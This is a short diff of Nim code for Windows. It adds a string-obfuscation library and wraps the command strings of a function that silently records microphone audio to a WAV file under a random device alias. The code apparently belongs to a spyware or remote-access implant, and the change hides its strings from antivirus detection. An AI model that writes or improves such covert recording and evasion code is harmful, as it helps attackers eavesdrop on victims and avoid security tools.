@@ -1,5 +1,6 @@
 import winim
 import helpers
+import NimProtect
 import os
 
 
@@ -7,8 +8,8 @@ proc record_audio*(wav_file_path: string, record_time: int): bool =
     
     var alias_name = get_random_string(6)
 
-    if mciSendString("open new type waveaudio alias " & alias_name, "", 0, 0) != 0 or
-     (mciSendString("record " & alias_name, "", 0, 0)) != 0:
+    if mciSendString(protectString("open new type waveaudio alias ") & alias_name, "", 0, 0) != 0 or
+     (mciSendString(protectString("record ") & alias_name, "", 0, 0)) != 0:
         return false
     
     sleep(record_time * 1000)
